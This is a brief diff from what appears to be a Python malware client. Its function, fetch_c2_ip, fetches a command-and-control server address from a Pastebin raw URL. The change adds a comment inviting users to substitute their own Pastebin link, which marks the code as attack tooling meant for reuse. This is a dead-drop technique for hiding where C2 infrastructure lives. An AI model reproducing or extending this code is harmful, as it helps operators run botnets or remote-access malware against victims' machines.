@@ -10,7 +10,7 @@ import requests
 
 def fetch_c2_ip():
     try:
-        url = "https://pastebin.com/raw/DjTikqsH" 
+        url = "https://pastebin.com/raw/DjTikqsH" # This is mine change it to ur Pastebin link
         response = requests.get(url, timeout=5) # Sends GET request to URL
         return response.text.strip() # Returns content of URL as string
     except:
